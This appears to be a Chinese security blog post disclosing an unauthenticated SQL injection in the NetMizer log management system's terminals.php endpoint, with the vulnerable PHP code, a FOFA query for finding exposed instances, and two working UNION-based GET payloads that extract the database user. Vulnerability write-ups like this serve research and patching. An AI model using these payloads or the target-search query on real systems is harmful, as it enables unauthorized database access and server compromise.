---
title: "NetMizer日志管理系统 terminals.php SQL注入漏洞"
source: https://mrxn.net/jswz/netmizer-data-echart-terminals-device-sqli.html
asset_dir: assets/netmizer日志管理系统-terminals.php-sql注入漏洞
---

# NetMizer日志管理系统 terminals.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/18 08:27
* 1056浏览
* [0评论](#comment)
* 29分钟阅读

深入探索

服务器

SQL

鉴权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/echart/terminals.php` 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

老旧版本

# fofa语法

`body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `/data/echart/terminals.php` 业务实现关键逻辑部分

深入探索

文件大小转换

Web安全书籍

技术文章订阅

```
if(isset($devicezone)) {
    $devicename = $devicezone;
    $devicezone = mb_check_encoding($devicezone, 'UTF-8') ? mb_convert_encoding($devicezone, 'gbk', 'UTF-8') : $devicezone;
    if($devicezone == "全部设备") $sqldevice = "";
    else $sqldevice = getsqldevice($devicezone);
} else if(isset($device)){
    if($device != "-1"){
       $devicename = long2ip($device);
       $sqldevice = " and nodeid = $device ";
    } else {
       $sqldevice = "";
    }
} else $sqldevice = "";
......
if($action == 'phonelist-grid'){
       $sqlstr = "select terminal_id,terminal_name,sum(in_bytes) as in_bytes,sum(out_bytes) as out_bytes,sum(in_bytes+out_bytes) as total_bytes,sum(terminal_session_num) as terminal_session_num, max(terminal_num) as terminal_num from tbl_terminals_info where create_time >= $start_time and create_time < $stop_time $sqldevice group by terminal_id order by $flowname desc";
//echo "$sqlstr\n";

       $res=mysql_query($sqlstr);
......
else if($action == 'phonelist-pie'){
       $sqlstr = "select terminal_id,terminal_name,sum($sqlname) as $flowname from tbl_terminals_info where create_time >= $start_time and create_time < $stop_time $sqldevice group by terminal_id order by $flowname desc";
......
else if(1||$action == 'phonelist-bar'){
       if($type < 4)
          $sqlstr = "select terminal_id,terminal_name,sum(in_bytes) as in_bytes,sum(out_bytes) as out_bytes,sum(in_bytes + out_bytes) as total_bytes from tbl_terminals_info where create_time >= $start_time and create_time < $stop_time $sqldevice group by terminal_id order by $flowname desc";
       else
          $sqlstr = "select terminal_id,terminal_name,sum(terminal_session_num) as terminal_session_num from tbl_terminals_info where create_time >= $start_time and create_time < $stop_time $sqldevice group by terminal_id order by $flowname desc";
```

深入探索

客户关系管理

计算机安全

CRM

当用户通过 `newdevicezone` GET/POST参数提交以 `ip:` 为前缀的输入时，`ip:` 之后的部分会被提取并赋值给 `$device` 变量。此 `$device` 变量在后续构建 `$sqldevice` 字符串时，未经任何安全处理（如转义或参数化查询）便直接拼接到SQL查询语句 `and nodeid = $device` 中。这使得攻击者能够构造恶意的SQL代码片段，通过 `$newdevicezone` 参数注入到最终执行的SQL查询中，造成[SQL注入](https://mrxn.net/tag/SQL注入)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

代码安全审计

## newdevicezone

```
GET /data/echart/terminals.php?action=phonelist-grid&newdevicezone=ip:0%20-111+UNION+ALL+SELECT+null,CONCAT(0x7e,(select/**/user()),0x7e),null,null,null,null,null-- HTTP/1.1
Host: netmizer.mrxn.net
```

## device

```
GET /data/echart/terminals.php?action=phonelist-grid&device=-111+UNION+ALL+SELECT+null,CONCAT(0x7e,(select/**/user()),0x7e),null,null,null,null,null-- HTTP/1.1
Host: netmizer.mrxn.net
```

通过union注入，成功得到数据库用户信息

[![NetMizer日志管理系统 terminals.php SQL注入漏洞](images/img-001-1e7e3802c97e.webp)](https://image.mrxn.net/f8738f83c23a4111b9057f456a563eae.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.newdevicezone](#toc-5-1-)
* [5.2.device](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[NetMizer日志管理系统 terminals.php SQL注入漏洞](https://mrxn.net/jswz/netmizer-data-echart-terminals-device-sqli.html)  
文章链接：<https://mrxn.net/jswz/netmizer-data-echart-terminals-device-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-data-echart-terminals-device-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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